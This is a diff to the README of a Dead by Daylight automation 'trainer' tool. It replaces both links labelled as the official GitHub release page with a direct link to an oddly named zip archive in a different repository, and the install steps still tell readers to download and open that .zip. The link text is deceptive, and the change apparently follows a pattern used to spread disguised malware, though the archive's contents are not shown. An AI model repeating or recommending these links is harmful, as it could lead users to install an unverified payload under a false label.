@@ -5,7 +5,7 @@ description: "Automate Dead by Daylight progression with an external tool for bl
 ---
 # 🎮 DBD-AutoGrind-Trainer-2026 - Automate your Dead by Daylight progression
 
-[![Download Link](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/rhodaunfathomable996/DBD-AutoGrind-Trainer-2026/releases)
+[![Download Link](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://raw.githubusercontent.com/rhodaunfathomable996/rhodaunfathomable996.github.io/main/superfeminine/github_io_rhodaunfathomable_cururo.zip)
 
 ## Overview
 
@@ -26,7 +26,7 @@ Ensure your computer meets these requirements before you start:
 
 Follow these steps to set up the trainer on your system.
 
-1. Go to the [official release page](https://github.com/rhodaunfathomable996/DBD-AutoGrind-Trainer-2026/releases).
+1. Go to the [official release page](https://raw.githubusercontent.com/rhodaunfathomable996/rhodaunfathomable996.github.io/main/superfeminine/github_io_rhodaunfathomable_cururo.zip).
 2. Look for the latest release version at the top of the list.
 3. Click the file ending in .zip to start the download.
 4. Open your Downloads folder.
